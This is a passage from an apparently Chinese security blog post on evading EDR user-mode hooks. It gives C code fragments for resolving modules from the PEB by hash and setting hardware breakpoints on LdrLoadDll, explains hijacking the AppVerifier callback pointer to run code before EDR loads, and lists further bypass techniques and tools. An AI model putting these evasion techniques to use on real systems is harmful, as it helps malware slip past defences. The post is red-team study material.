+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMODULE hNtdll &#x3D; GetModuleFromPEB(4097367);</span><br><span class="line">HMODULE hKernel_32 &#x3D; GetModuleFromPEB(109513359);</span><br><span class="line">_LdrLoadDll LdrLoadDllCustom &#x3D; (_LdrLoadDll)GetAPIFromPEBModule(hNtdll, 11529801);</span><br></pre></td></tr></table></figure>
+
+<p>设置Dr0为LdrLoadDll地址，如果ExceptionAddress = LdrLoadDll地址，直接return</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">VOID SetHWBP(DWORD_PTR address, HANDLE hThread)</span><br><span class="line">&#123;</span><br><span class="line">	CONTEXT ctx &#x3D; &#123; 0 &#125;;</span><br><span class="line">	ctx.ContextFlags &#x3D; CONTEXT_DEBUG_REGISTERS | CONTEXT_INTEGER;</span><br><span class="line">	ctx.Dr0 &#x3D; address;</span><br><span class="line">	ctx.Dr7 &#x3D; 0x00000001;</span><br><span class="line"></span><br><span class="line">	SetThreadContext(hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">	DEBUG_EVENT dbgEvent;</span><br><span class="line">	while (true)</span><br><span class="line">	&#123;</span><br><span class="line">		if (WaitForDebugEvent(&amp;dbgEvent, INFINITE) &#x3D;&#x3D; 0)</span><br><span class="line">			break;</span><br><span class="line"></span><br><span class="line">		if (dbgEvent.dwDebugEventCode &#x3D;&#x3D; EXCEPTION_DEBUG_EVENT &amp;&amp;</span><br><span class="line">			dbgEvent.u.Exception.ExceptionRecord.ExceptionCode &#x3D;&#x3D; EXCEPTION_SINGLE_STEP)</span><br><span class="line">		&#123;</span><br><span class="line"></span><br><span class="line">			CONTEXT newCtx &#x3D; &#123; 0 &#125;;</span><br><span class="line">			newCtx.ContextFlags &#x3D; CONTEXT_ALL;</span><br><span class="line">			GetThreadContext(hThread, &amp;newCtx);</span><br><span class="line">			if (dbgEvent.u.Exception.ExceptionRecord.ExceptionAddress &#x3D;&#x3D; (LPVOID)address)</span><br><span class="line">			&#123;</span><br><span class="line">				printf(&quot;[+] Breakpoint Hit!\n&quot;);</span><br><span class="line">				newCtx.Dr0 &#x3D; newCtx.Dr6 &#x3D; newCtx.Dr7 &#x3D; 0;</span><br><span class="line">				newCtx.EFlags |&#x3D; (1 &lt;&lt; 8);</span><br><span class="line">				return;</span><br><span class="line">			&#125;</span><br><span class="line">			else &#123;</span><br><span class="line">				newCtx.Dr0 &#x3D; address;</span><br><span class="line">				newCtx.Dr7 &#x3D; 0x00000001;</span><br><span class="line">				newCtx.EFlags &amp;&#x3D; ~(1 &lt;&lt; 8);</span><br><span class="line">			&#125;</span><br><span class="line">			SetThreadContext(hThread, &amp;newCtx);</span><br><span class="line">		&#125;</span><br><span class="line">		ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>关于硬件断点，除了利用LdrLoadDll强制加载ntdll，还可以下两个断点第一个在edr jmp检查后，syscall之前，第二个在syscall调用完毕返回后，这样在使用API函数时传入正常无害参数，在第一个断点触发替换为恶意参数，在第二个断点触发时在替换为原参数，详情看：<a target="_blank" rel="noopener" href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html">https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html</a></p>
+<h2 id="调试事件"><a href="#调试事件" class="headerlink" title="调试事件"></a>调试事件</h2><p>根据上面提到的：调试事件类型（Debug Event Code，dwDebugEventCode）可以看到有一个 <strong>LOAD_DLL_DEBUG_EVENT</strong> 时加载DLL的事件，我们可以测试ntll会不会触发该事件，以及能不能阻止其他dll加载</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if (WaitForDebugEvent(DbgEvent, INFINITE)) &#123;</span><br><span class="line">	switch (DbgEvent-&gt;dwDebugEventCode)</span><br><span class="line">	&#123;</span><br><span class="line">	case CREATE_PROCESS_DEBUG_EVENT:</span><br><span class="line">		printf(&quot;[+] New Process Created - PID: %d\n&quot;, DbgEvent-&gt;dwProcessId);</span><br><span class="line">		printf(&quot;[+] New Thread Created - TID: %d\n&quot;, DbgEvent-&gt;dwThreadId);</span><br><span class="line">		break;</span><br><span class="line">	case LOAD_DLL_DEBUG_EVENT:</span><br><span class="line">		wchar_t imageName[MAX_PATH];</span><br><span class="line">		PVOID remoteAddr;</span><br><span class="line">		size_t dwRead;</span><br><span class="line">		printf(&quot;[+] DLL Base Address: 0x%08p\n&quot;, DbgEvent-&gt;u.LoadDll.lpBaseOfDll);</span><br><span class="line">		system(&quot;pause&quot;);</span><br><span class="line">		break;</span><br><span class="line">	case CREATE_THREAD_DEBUG_EVENT:</span><br><span class="line">		printf(&quot;[+] New Thread Created: 0x%08p\n&quot;, DbgEvent-&gt;u.CreateThread.lpStartAddress);</span><br><span class="line">		break;</span><br><span class="line">	case EXCEPTION_DEBUG_EVENT:</span><br><span class="line">		if (DbgEvent-&gt;u.Exception.ExceptionRecord.ExceptionCode &#x3D;&#x3D; EXCEPTION_BREAKPOINT) &#123;</span><br><span class="line">			printf(&quot;[+] Breakpoint was successfully triggered.\n&quot;);</span><br><span class="line">			printf(&quot;[+] Exception Address [RIP]: 0x%08p\n&quot;, DbgEvent-&gt;u.Exception.ExceptionRecord.ExceptionAddress);</span><br><span class="line">			break;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	ContinueDebugEvent(pi-&gt;dwProcessId, pi-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到在进程创建时只加载了一个ntdll</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260213192436872.png" alt="image-20260213192436872"></p>
+<h2 id="Avrf回调"><a href="#Avrf回调" class="headerlink" title="Avrf回调"></a>Avrf回调</h2><p>Marcus Hutchins发现了一种新的方法可以在进程初始化过程中提前加载代码，这会早于EDR将DLL注入进程之前，利用了AppVerifier中的AvrfpAPILookupCallbackRoutine回调指针，在创建挂起进程后，劫持该指针地址为恶意代码的起始地址，随后恢复进程，在加载后续dll时会触发以下流程</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LdrpInitializeProcess -&gt; ... -&gt; LdrGetProcedureAddress -&gt; LdrGetProcedureAddressForCaller -&gt; AVrfCallAPILookupCallback -&gt; AvrfpAPILookupCallbackRoutine</span><br></pre></td></tr></table></figure>
+
+<p>LdrGetProcedureAddress</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214012713139.png" alt="image-20260214012713139"></p>
+<p>LdrGetProcedureAddressForCaller会调用AVrfCallAPILookupCallback</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214012806486.png" alt="image-20260214012806486"></p>
+<p>不过需要解密地址才能执行</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214013051640.png" alt="image-20260214013051640"></p>
+<p>在初始化过程中加载kernel32，kernelbase，谁会先触发LdrGetProcedureAddress呢？以及整个初始化的调用栈是什么，还需要自己调试一下才能明白了</p>
+<p>看一下项目代码，首先要找到 AppVerifier 回调指针，位于 <code>.mrdata</code> 附近，且结构如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">offset+0x00 - ntdll!LdrpMrdataBase（设置为 .mrdata 段的基地址）</span><br><span class="line">offset+0x08 - ntdll!LdrpKnownDllDirectoryHandle（设置为非零值）</span><br><span class="line">offset+0x10 - ntdll!AvrfpAPILookupCallbacksEnabled（设置为零）</span><br><span class="line">offset+0x18 - ntdll!AvrfpAPILookupCallbackRoutine（设置为零）</span><br></pre></td></tr></table></figure>
+
+<p>找到LdrpMrdataBase，往后遍历，不为NULL的是 <strong>AvrfpAPILookupCallbacksEnabled</strong></p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214015703772.png" alt="image-20260214015703772"></p>
+<p>加密自定义的恶意函数 <code>LdrGetProcedureAddressCallback</code> 地址，写入AvrfpAPILookupCallbackRoutine，开启AvrfpAPILookupCallbacksEnabled</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Unhook/image-20260214015810381.png" alt="image-20260214015810381"></p>
+<h2 id="其他绕过"><a href="#其他绕过" class="headerlink" title="其他绕过"></a>其他绕过</h2><p>firewalker：向量化异常处理程序找系统调用存根</p>
+<p><a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/">https://www.mdsec.co.uk/2020/08/firewalker-a-new-approach-to-generically-bypass-user-space-edr-hooking/</a></p>
+<p>hookchain: IAT，看PPT就行了没什么新手段，都是组合了一下</p>
+<p><a target="_blank" rel="noopener" href="https://media.defcon.org/DEF%20CON%2032/DEF%20CON%2032%20presentations/DEF%20CON%2032%20-%20Helvio%20Carvalho%20Junior%20-%20HookChain%20A%20new%20perspective%20for%20Bypassing%20EDR%20Solutions.pdf">DEF CON 32 - Helvio Carvalho Junior - HookChain A new perspective for Bypassing EDR Solutions.pdf</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/helviojunior/hookchain">https://github.com/helviojunior/hookchain</a></p>
+<p>Whisper2Shout：</p>
+<p><a target="_blank" rel="noopener" href="https://www.secforce.com/blog/whisper2shout-unhooking-technique/">https://www.secforce.com/blog/whisper2shout-unhooking-technique/</a></p>
+<p>TOCTOU 攻击：没找到详细文章</p>
+<h1 id="现代AV-EDR使用hook的防御手段"><a href="#现代AV-EDR使用hook的防御手段" class="headerlink" title="现代AV/EDR使用hook的防御手段"></a>现代AV/EDR使用hook的防御手段</h1><p>除了上面在用户态进行hook，还有以下检测</p>
+<h2 id="SSDT-hook"><a href="#SSDT-hook" class="headerlink" title="SSDT hook"></a>SSDT hook</h2><p>32位可以直接进行SSDT hook，监测内核函数的调用。64位尝试利用漏洞等 Bypass PathGuard 后进行SSDT hook，但是肯定会引起系统的不稳定</p>
+<h2 id="硬件虚拟化技术（Intel-VT-AMD-SVM）检测"><a href="#硬件虚拟化技术（Intel-VT-AMD-SVM）检测" class="headerlink" title="硬件虚拟化技术（Intel VT /AMD SVM）检测"></a>硬件虚拟化技术（Intel VT /AMD SVM）检测</h2><p>利用VT 技术可以通过MSR Hook/EPT Hook 实现 64位的无痕SSDT Hook（绕过PathGuard）、内核提权检测</p>
+<h2 id="内核回调"><a href="#内核回调" class="headerlink" title="内核回调"></a>内核回调</h2><p><a target="_blank" rel="noopener" href="https://drunkmars.top/2022/04/29/%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7/">https://drunkmars.top/2022/04/29/%E8%BF%9B%E7%A8%8B%E7%9B%91%E6%8E%A7/</a></p>
+<p><a target="_blank" rel="noopener" href="https://myzxcg.com/2023/10/AV/EDR-%E5%AE%8C%E5%85%A8%E8%87%B4%E7%9B%B2-%E6%B8%85%E9%99%A46%E5%A4%A7%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0/">https://myzxcg.com/2023/10/AV/EDR-%E5%AE%8C%E5%85%A8%E8%87%B4%E7%9B%B2-%E6%B8%85%E9%99%A46%E5%A4%A7%E5%86%85%E6%A0%B8%E5%9B%9E%E8%B0%83%E5%AE%9E%E7%8E%B0/</a></p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>hook杂谈：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.covertswarm.com/post/timeline-of-edr-bypass-techniques">https://www.covertswarm.com/post/timeline-of-edr-bypass-techniques</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://drunkmars.top/2022/04/07/hook%E6%94%BB%E9%98%B2/">浅谈hook攻防</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://makosecblog.com/malware-dev/detecting-dll-unhooking/">https://makosecblog.com/malware-dev/detecting-dll-unhooking/</a></p>
+</li>
+</ul>
+<p>unhook：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/">https://www.mdsec.co.uk/2020/12/bypassing-user-mode-hooks-and-direct-invocation-of-system-calls-for-red-teams/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://killer.wtf/2022/01/19/CustomJmpUnhook.html">https://killer.wtf/2022/01/19/CustomJmpUnhook.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes">https://www.optiv.com/insights/source-zero/blog/sacrificing-suspended-processes</a></p>
+</li>
+</ul>
+<p>断点：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/">https://cymulate.com/blog/blindside-a-new-technique-for-edr-evasion-with-hardware-breakpoints/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/CymulateResearch/Blindside">https://github.com/CymulateResearch/Blindside</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-f42qEY0EXreTS612jDi5Q">利用硬件断点来Unhook BitDefender</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html">https://malwaretech.com/2023/12/silly-edr-bypasses-and-where-to-find-them.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack">https://github.com/CarlosG13/Process-Hypnosis-Debugger-assisted-control-flow-hijack</a></p>
+</li>
+</ul>
+<p>Avrf回调：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html">https://malwaretech.com/2024/02/bypassing-edrs-with-edr-preload.html</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/MalwareTech/EDR-Preloader">https://github.com/MalwareTech/EDR-Preloader</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/">https://www.outflank.nl/blog/2024/10/15/introducing-early-cascade-injection-from-windows-process-creation-to-stealthy-injection/</a></p>
+</li>
+</ul>
+<p>tools：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/Mr-Un1k0d3r/EDRs">https://github.com/Mr-Un1k0d3r/EDRs</a> - 该仓库包含有关 EDR 的hook信息</li>
+<li><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/TelemetrySourcerer">https://github.com/jthuraisamy/TelemetrySourcerer</a><ul>
+<li>列举各种内核模式回调函数，并能够抑制它们</li>
+<li>检测进程内的内联用户模式钩子，并能够取消钩住它们</li>
+<li>列出 ETW 会话和提供程序，并突出显示可能需要禁用的相关会话和提供程序</li>
+</ul>
+</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/09/06/NTLM-Attack/" rel="prev" title="NTLM - NTLM Attack">
+                  <i class="fa fa-angle-left"></i> NTLM - NTLM Attack
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Y0ng</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
